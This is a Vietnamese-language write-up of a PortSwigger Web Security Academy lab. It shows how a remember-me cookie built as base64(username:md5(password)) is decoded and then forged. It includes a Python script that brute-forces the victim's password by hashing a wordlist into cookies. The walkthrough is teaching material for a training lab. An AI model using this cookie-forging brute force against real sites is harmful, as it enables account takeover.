![[auth-stay-logged-in.png]]
-mô tả lab: lab có chức năng `stay-logged-in` (remember me). Cookie của nó cấu tạo rất ngớ ngẩn nên mình brute được.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

### hướng giải
- [ ] mình tạo 1 account của mình rồi tick `stay-logged-in`, sau đó quan sát cookie này, mình thấy nó là `stay-logged-in=...` base64 rất dài
- [ ] mình decode base64 ra, mình thấy nó có dạng `test:5f4dcc3b5aa765d61d8327deb882cf99`
- [ ] mình search cái hash `5f4dcc3b...` trên Google, mình thấy nó chính là md5 của `password`
- [ ] => nên mình chốt công thức là `base64(username:md5(password))`
- [ ] vậy để giả làm `carlos`, mình chỉ cần brute md5 password của `carlos` rồi tự tạo cookie

### giải
-bước 1: mình confirm công thức bằng cách đổi password account của mình, rồi xem cookie đổi theo. Đúng là md5 đổi theo password thật.

-bước 2: mình brute password của `carlos`. Mình lấy list password mẫu, hash md5 từng cái rồi tạo cookie:
```python
import hashlib, base64, requests
passwords = open("passwords.txt").read().splitlines()
for pw in passwords:
    h = hashlib.md5(pw.encode()).hexdigest()
    cookie_val = base64.b64encode(f"carlos:{h}".encode()).decode()
    r = requests.get("https://LAB-ID.web-security-academy.net/my-account",
        cookies={"session":"SESSION_CUA_MINH", "stay-logged-in": cookie_val},
        allow_redirects=False)
    # sau khi quan sát gói tin này, mình thấy sai thì nó vẫn ở /login, đúng thì 200 hiện My Account carlos
    if "carlos" in r.text.lower() and "my account" in r.text.lower():
        print(f"trúng {pw} -> {cookie_val}")
        break
```
![[auth-stay-logged-in-brute.png]]
-kết quả mình tìm được password của `carlos` là `montoya` (tùy instance).

-mình set cookie `stay-logged-in` vừa tìm được vào browser rồi vào `/my-account` là solve.

> [!NOTE]
> -bài học của mình: cookie mà dùng `md5(password)` không salt thì tra rainbow table 1 phát là ra. Lại còn base64 thì ai cũng decode được.
